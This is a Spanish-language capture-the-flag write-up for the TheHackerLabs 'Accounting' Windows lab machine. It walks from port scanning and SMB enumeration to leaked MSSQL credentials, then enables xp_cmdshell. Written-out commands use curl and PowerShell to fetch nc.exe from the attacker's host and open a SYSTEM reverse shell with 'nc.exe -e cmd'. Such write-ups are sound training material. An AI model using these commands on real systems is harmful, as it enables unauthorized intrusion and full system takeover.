---
title: "Accounting - TheHackerLabs"
date: 2025-03-07
draft: false
slug: "THL-writeup-accounting"
excerpt: "Una máquina que te puede sorprender si te confías. Después de analizar los escaneos, descubrimos una página web activa, descubrimos que no es necesario loguearnos en el servicio SMB para listar los recursos compartidos y que el servicio MSSQL se encuentra activo. Aplicando Fuzzing a la página web, descubrimos las credenciales de acceso, pero no podemos aprovecharnos de las funciones de la página, por lo que la descartamos. Enumerando el servicio SMB, descubrimos un archivo que contiene las credenciales de acceso del servicio MSSQL. Utilizando netexec, comprobamos que podemos loguearnos en el servicio MSSQL. Ya dentro del MSSQL, habilitamos el xp_cmdshell para ejecutar comandos, del que nos aprovechamos para aplicar una Reverse Shell y así obtener una sesión de la máquina víctima, siendo que nos conecta como el usuario Administrador."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Windows", "SMB", "MSSQL", "CONTPAQi", "Fuzzing", "Information Leakage", "SMB Enumeration", "Weak Credential Storage", "Remote Command Execution (RCE)", "Enabling xp_cmdshell (RCE)", "Privesc - Enabling xp_cmdshell (RCE)", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "netexec"
  - "impacket-mssqlclient"
  - "xp_cmdshell"
  - "nc.exe"
  - "powershell"
  - "Invoke-WebRequest"
  - "rlwrap"
  - "nc"
  - "impacket-smbserver"
  - "Python3"
  - "more"
links:
  - "https://www.reviversoft.com/es/file-extensions/ads"
  - "https://gist.github.com/chriselgee/bf41951d0b51d0ef9d2504a36921cd13"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-accounting/accounting.jpg"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 11:11 CST
...
...
Nmap scan report for 192.168.1.150
Host is up (0.00092s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.1.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.150   XX  	PCS Systemtechnik GmbH
```

Encontramos nuestro objetivo y es: `192.168.1.150`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.150
PING 192.168.1.150 (192.168.1.150) 56(84) bytes of data.
64 bytes from 192.168.1.150: icmp_seq=1 ttl=128 time=1.09 ms
64 bytes from 192.168.1.150: icmp_seq=2 ttl=128 time=2.11 ms
64 bytes from 192.168.1.150: icmp_seq=3 ttl=128 time=1.30 ms
64 bytes from 192.168.1.150: icmp_seq=4 ttl=128 time=1.31 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.150 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 11:13 CST
Initiating ARP Ping Scan at 11:13
Scanning 192.168.1.150 [1 port]
Completed ARP Ping Scan at 11:13, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:13
Scanning 192.168.1.150 [65535 ports]
Discovered open port 445/tcp on 192.168.1.150
Discovered open port 135/tcp on 192.168.1.150
Discovered open port 139/tcp on 192.168.1.150
Discovered open port 9047/tcp on 192.168.1.150
Discovered open port 2103/tcp on 192.168.1.150
Discovered open port 7680/tcp on 192.168.1.150
Discovered open port 9080/tcp on 192.168.1.150
Discovered open port 9147/tcp on 192.168.1.150
Discovered open port 1801/tcp on 192.168.1.150
Discovered open port 1099/tcp on 192.168.1.150
Discovered open port 49665/tcp on 192.168.1.150
Discovered open port 9083/tcp on 192.168.1.150
Discovered open port 9081/tcp on 192.168.1.150
Discovered open port 49992/tcp on 192.168.1.150
Discovered open port 49669/tcp on 192.168.1.150
Discovered open port 5040/tcp on 192.168.1.150
Discovered open port 49667/tcp on 192.168.1.150
Discovered open port 49672/tcp on 192.168.1.150
Discovered open port 49666/tcp on 192.168.1.150
Discovered open port 2105/tcp on 192.168.1.150
Discovered open port 49681/tcp on 192.168.1.150
Discovered open port 49734/tcp on 192.168.1.150
Discovered open port 2107/tcp on 192.168.1.150
Discovered open port 49664/tcp on 192.168.1.150
Increasing send delay for 192.168.1.150 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 9079/tcp on 192.168.1.150
Increasing send delay for 192.168.1.150 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 49672/tcp on 192.168.1.150
Discovered open port 49667/tcp on 192.168.1.150
Completed SYN Stealth Scan at 11:14, 62.99s elapsed (65535 total ports)
Nmap scan report for 192.168.1.150
Host is up, received arp-response (0.041s latency).
Scanned at 2025-03-07 11:13:19 CST for 63s
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE        REASON
135/tcp   open  msrpc          syn-ack ttl 128
139/tcp   open  netbios-ssn    syn-ack ttl 128
445/tcp   open  microsoft-ds   syn-ack ttl 128
1099/tcp  open  rmiregistry    syn-ack ttl 128
1801/tcp  open  msmq           syn-ack ttl 128
2103/tcp  open  zephyr-clt     syn-ack ttl 128
2105/tcp  open  eklogin        syn-ack ttl 128
2107/tcp  open  msmq-mgmt      syn-ack ttl 128
5040/tcp  open  unknown        syn-ack ttl 128
7680/tcp  open  pando-pub      syn-ack ttl 128
9047/tcp  open  unknown        syn-ack ttl 128
9079/tcp  open  unknown        syn-ack ttl 128
9080/tcp  open  glrpc          syn-ack ttl 128
9081/tcp  open  cisco-aqos     syn-ack ttl 128
9083/tcp  open  emc-pp-mgmtsvc syn-ack ttl 128
9147/tcp  open  unknown        syn-ack ttl 128
49664/tcp open  unknown        syn-ack ttl 128
49665/tcp open  unknown        syn-ack ttl 128
49666/tcp open  unknown        syn-ack ttl 128
49667/tcp open  unknown        syn-ack ttl 128
49669/tcp open  unknown        syn-ack ttl 128
49672/tcp open  unknown        syn-ack ttl 128
49681/tcp open  unknown        syn-ack ttl 128
49734/tcp open  unknown        syn-ack ttl 128
49992/tcp open  unknown        syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 63.21 seconds
           Raw packets sent: 232516 (10.231MB) | Rcvd: 66132 (2.646MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Waos, son bastantes puertos abiertos. Esto se va a poner interesante.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 135,139,445,1099,1801,2103,2105,2107,5040,7680,9047,9079,9080,9081,9083,9147,49664,49665,49666,49667,49669,49672,49681,49734,49992 192.168.1.150 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 11:17 CST
Nmap scan report for 192.168.1.150
Host is up (0.0024s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1099/tcp  open  java-object   Java Object Serialization
1801/tcp  open  msmq?
2103/tcp  open  msrpc         Microsoft Windows RPC
2105/tcp  open  msrpc         Microsoft Windows RPC
2107/tcp  open  msrpc         Microsoft Windows RPC
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9081/tcp  open  http          Microsoft Cassini httpd 4.0.1.6 (ASP.NET 4.0.30319)

|_http-server-header: Cassini/4.0.1.6
| http-title: Login Saci
|_Requested resource was /App/Login.aspx
9083/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9147/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
49992/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM

| ms-sql-ntlm-info: 
|   192.168.1.150\COMPAC: 
|     Target_Name: DESKTOP-M464J3M
|     NetBIOS_Domain_Name: DESKTOP-M464J3M
|     NetBIOS_Computer_Name: DESKTOP-M464J3M
|     DNS_Domain_Name: DESKTOP-M464J3M
|     DNS_Computer_Name: DESKTOP-M464J3M
|_    Product_Version: 10.0.19041
| ms-sql-info: 
|   192.168.1.150\COMPAC: 
|     Instance name: COMPAC
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 49992
|_    Clustered: false
|_ssl-date: 2025-03-07T18:20:21+00:00; +59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-07T18:11:00
|_Not valid after:  2055-03-07T18:11:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1099-TCP:V=7.95%I=7%D=3/7%Time=67CB2A15%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2025-03-07T18:19:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DESKTOP-M464J3M, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: mean: 59m58s, deviation: 0s, median: 59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.81 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Veo varias cosillas que podemos hacer por aquí.

Para empezar, parece que podremos enumerar el **servicio SMB**, ya que el escaneo nos indica que no es necesario loguearse, pero hay que comprobarlo primero.

Parece haber una página web activa en el **puerto 9081**, que es lo primero que vamos a investigar.

Y por último, está activo el **servicio MSSQL** en el **puerto 49992**, por lo que probablemente podamos aprovecharnos de este más adelante.

Bien, vayamos a ver esa página.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-accounting/Captura1.png">
</p>

Esto es un login de una aplicación web o software llamado **CONTPAQi**. Investiguemos de que se trata:

| **CONTPAQi** |
|:-----------:|
| *CONTPAQi es un software administrativo empresarial que ayuda a las empresas a gestionar su contabilidad, nómina, facturación, y más. Es una de las herramientas favoritas de los contadores en México.* |

Entonces, es un software de administración empresarial de contabilidad.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-accounting/Captura2.png">
</p>

Parece que funciona con **ASP.NET**, por lo que podríamos buscar archivos **ASP/ASPX**, pero primero quiero ver si no hay algún directorio o archivo que podamos ver aplicando **Fuzzing**.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.150:9081/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.150:9081/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000002:   302        3 L      8 W        125 Ch      "images"                                                                                                                     
000000003:   302        3 L      8 W        127 Ch      "download"                                                                                                                   
000000536:   302        3 L      8 W        122 Ch      "css"                                                                                                                        
000000076:   302        3 L      8 W        123 Ch      "docs"
...
...
...
Total time: 0
Processed Requests: 220545
Filtered Requests: 220479
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.150:9081/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.150:9081/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 302) [Size: 122] [--> /img/]
/images               (Status: 302) [Size: 125] [--> /images/]
/download             (Status: 302) [Size: 127] [--> /download/]
/docs                 (Status: 302) [Size: 123] [--> /docs/]
...
...
...
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Hay varios directorios, pero si revisamos el directorio `/download`, veremos un archivo de texto:

<p align="center">
<img src="/assets/images/THL-writeup-accounting/Captura3.png">
</p>

Vamos a verlo:

<p align="center">
<img src="/assets/images/THL-writeup-accounting/Captura4.png">
</p>

Parecen ser un usuario y contraseña.

Si los probamos en el login, podremos ganar acceso:

<p align="center">
<img src="/assets/images/THL-writeup-accounting/Captura5.png">
</p>

Muy bien, el problema es que aquí no podremos hacer nada, ya que nos pedirá registrar una empresa y a veces tendrá fallos al momento de usar algunas de sus funciones, por lo que podemos descartar esta página web para poder usarla contra la máquina víctima.

### Enumeración de Servicio SMB {#SMB}

Veamos que información nos da **crackmapexec**:
```bash
crackmapexec smb 192.168.1.150
SMB         192.168.1.150  445    DESKTOP-M464J3M  [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-M464J3M) (domain:DESKTOP-M464J3M) (signing:False) (SMBv1:False)
```
Excelente, si veo probable que podamos enumerar el servicio.

Veamos si podemos listar los recursos compartidos con **smbclient**:
```bash
smbclient -L //192.168.1.150// -N
.
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Admin remota
	C$              Disk      Recurso predeterminado
	Compac          Disk      
	IPC$            IPC       IPC remota
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.150 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Podemos listarlos.

Si tratamos de usar **smbmap**, necesitaremos indicarle un usuario nulo:
```bash
smbmap -H 192.168.1.150 -u none
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.1.150:445	Name: 192.168.1.150      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Compac                                            	READ, WRITE	
	IPC$                                              	READ ONLY	IPC remota
	Users                                             	READ ONLY	
[*] Closed 1 connections
```
Parece que podemos listar los recursos del **directorio Compac**.

Revisando un poco el contenido de este recurso, encontramos un archivo de texto dentro de `Compac/Empresas` llamado **SQL.txt**:
```bash
smbmap -H 192.168.1.150 -u none -r Compac/Empresas
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.1.150:445	Name: 192.168.1.150      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Compac                                            	READ, WRITE	
	./CompacEmpresas
	dr--r--r--                0 Fri May 10 21:14:07 2024	.
	dr--r--r--                0 Fri May 10 21:14:07 2024	..
	dr--r--r--                0 Fri May 10 21:14:07 2024	Esquemas
	dr--r--r--                0 Fri May 10 21:14:07 2024	Reportes
	fr--r--r--              448 Fri May 10 21:14:07 2024	SQL.txt
	IPC$                                              	READ ONLY	IPC remota
	Users                                             	READ ONLY	
[*] Closed 1 connections
```

Vamos a descargarlo:
```bash
smbmap -H 192.168.1.150 -u none --download Compac/Empresas/SQL.txt
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[+] Starting download: Compac\Empresas\SQL.txt (448 bytes)                                                               
[+] File output to: /../TheHackersLabs/Accounting/content/192.168.1.150-Compac_Empresas_SQL.txt
[*] Closed 1 connections
```

Y ahora veamos su contenido:
```bash
cat 192.168.1.150-Compac_Empresas_SQL.txt
SQL 2017 
Instancia COMPAC 
sa 
******

ip
127.0.0.1

Tip para terminar instalaciones
1) Ejecutar seguridad de icono
Sobre el icono asegurarse que diga ejecutar como Administrador.

2) Ejecutar el comando regedit...
Buscar la llave Hkey Local Machine, luego Software, luego Wow32, Computacion en Accion...(abri pantalla con boton del lado derecho
donde dice seguridad y ver que aparezca "everyone" y darle control total
```

Parece que tenemos la contraseña para entrar al **servicio MSSQL**.

## Explotación de Vulnerabilidades {#Explotacion}

### Conectandonos al Servicio MSSQL y Activando xp_cmdshell {#MSSQL}

Vamos a comprobar si estas credenciales sirven para entrar en el **servicio MSSQL** con la herramienta **netexec**, ya que parece que **crackmapexec** tiene problemas para comprobarlo:
```bash
netexec mssql 192.168.1.150 --port 49992 -u 'sa' -p '******' --local-auth
MSSQL       192.168.1.150  49992  DESKTOP-M464J3M  [*] Windows 10 / Server 2019 Build 19041 (name:DESKTOP-M464J3M) (domain:DESKTOP-M464J3M)
MSSQL       192.168.1.150  49992  DESKTOP-M464J3M  [+] DESKTOP-M464J3M\sa:****** (Pwn3d!)
```
Excelente, podemos conectarnos.

Lo haremos con la herramienta **impacket-mssqlclient**:
```bash
impacket-mssqlclient DESKTOP-M464J3M/sa:******@192.168.1.150 -p 49992
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DESKTOP-M464J3M\COMPAC): Line 1: Changed database context to 'master'.
[*] INFO(DESKTOP-M464J3M\COMPAC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```
Listo, estamos dentro.

Ahora, veamos qué comandos podemos usar:
```batch
SQL (sa  dbo@master)> help
.
    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```
Podemos habilitar **xp_cmdshell** para poder ejecutar comandos.

Habilitémoslo:
```batch
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DESKTOP-M464J3M\COMPAC): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DESKTOP-M464J3M\COMPAC): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

Probemos a ejecutar un comando:
```batch
SQL (sa  dbo@master)> xp_cmdshell "whoami"
output                
-------------------   
nt authority\system   

NULL
```
Genial, parece que somos el administrador.

En caso de que no pudiéramos habilitar **xp_cmdshell** con el comando **enable_xp_cmdshell**, podemos hacerlo de forma manual:
```batch
SQL (sa  dbo@master)> SP_CONFIGURE "show advanced options", 1;
INFO(DESKTOP-M464J3M\COMPAC): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE;
SQL (sa  dbo@master)> SP_CONFIGURE "xp_cmdshell", 1;
INFO(DESKTOP-M464J3M\COMPAC): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE;
```

## Post Explotación {#Post}

### Obteniendo Reverse Shell de la Máquina Víctima Mediante Varios Métodos {#Sesiones}

La idea es que podamos utilizar una shell con la que podamos movernos libremente.

Existen varias formas que podemos hacerlo, pero lo que sí vamos a utilizar en todas, es el **binario netcat / binario nc.exe**.

La idea es cargar el **binario nc.exe** para poder mandarnos una **Reverse Shell** desde la máquina víctima a la nuestra.

Dentro de **Kali**, ya tenemos varios binarios que podemos utilizar, entre ellos el **binario nc.exe**:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```
Cópialo dentro de tu directorio de trabajo.

Y vamos a crear un directorio temporal en donde guardaremos ese binario:
```batch
SQL (sa  dbo@master)> xp_cmdshell "mkdir C:\Temp"
output   
------   
NULL
```
Listo, veamos que formas tenemos de cargarlo o usar este binario.

#### Cargando Binario nc.exe con curl y Obteniendo Reverse Shell {#netcat}

Comprobamos que exista y que podemos usar el comando **curl**:
```batch
SQL (sa  dbo@master)> xp_cmdshell "curl"
output                                         
--------------------------------------------   
curl: try 'curl --help' for more information   

NULL 
```
Excelente, si lo tenemos.

Abre un servidor de **Python** en donde tengas el **binario nc.exe**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ahora, vamos a descargar el **binario nc.exe** utilizando **curl**:
```batch
SQL (sa  dbo@master)> xp_cmdshell "curl http://Tu_IP/nc.exe -o C:\Temp\nc.exe"
output                                                                             
--------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current    

                                 Dload  Upload   Total   Spent    Left  Speed      

100 59392  100 59392    0     0  4047k      0 --:--:-- --:--:-- --:--:-- 4142k   

NULL
```

Abre una **netcat** con **rlwrap** en tu máquina:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Y envía una **Reverse Shell** utilizando el **binario nc.exe**:
```batch
SQL (sa  dbo@master)> xp_cmdshell "C:\Temp\nc.exe -e cmd Tu_IP 443"
```

Observa tu **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.150] 50015
Microsoft Windows [Versi�n 10.0.19045.2965]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system
```
Listo, tenemos una shell y somos el **Administrador**.

#### Utilizando cmdlet Invoke-WebRequest de PowerShell para Descargar Binario nc.exe y Obteniendo Reverse Shell {#cmdlet}

Para el caso anterior, utilizamos **curl**, pero ¿y si no lo tuviéramos?

Tenemos otras opciones, como utilizar el **comando iex de PowerShell** para ejecutar archivos web de manera remota, pero en mi caso este no me funciono.

Por lo que vamos a probar a descargar el **binario nc.exe** desde la máquina víctima, con el **cmdlet Invoke-WebRequest de PowerShell**.

Probemos si podemos ejecutar comandos de **PowerShell**:
```batch
SQL (sa  dbo@master)> xp_cmdshell powershell -c "whoami"
output                
-------------------   
nt authority\system   

NULL
```
Sí funciona.

Abre un servidor de **Python** en donde tengas el **binario nc.exe**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Probemos el **cmdlet**:
```batch
SQL (sa  dbo@master)> xp_cmdshell powershell -c "Invoke-WebRequest -Uri "http://Tu_IP/nc.exe" -OutFile "C:\Temp\nc.exe""
output   
------   
NULL
```

Comprobemos si se descargó el binario:
```batch
SQL (sa  dbo@master)> xp_cmdshell "dir C:\Temp"
output                                               
--------------------------------------------------
...
...
...
03/07/2025  04:51 PM            59,392 nc.exe
```
Ahí está.

Abre una **netcat** con **rlwrap** en tu máquina:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Y envía una **Reverse Shell** utilizando el **binario nc.exe**:
```batch
SQL (sa  dbo@master)> xp_cmdshell "C:\Temp\nc.exe -e cmd Tu_IP 443"
```

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.150] 50015
Microsoft Windows [Versi�n 10.0.19045.2965]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system
```

#### Creando Servidor SMB con impacket-smbserver, Ejecutando Binario nc.exe de Manera Remota para Obtener Reverse Shell y Leyendo Archivo Tipo ADS {#impacketSMB}

Otra opción que podemos usar, es levantar un **servidor SMB** en nuestra máquina, para poder ejecutar el **binario nc.exe** de manera remota desde la máquina víctima.

Levantemos el **servidor SMB** en nuestro directorio de trabajo:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID ...
...
```

Recuerda abrir una **netcat** con **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

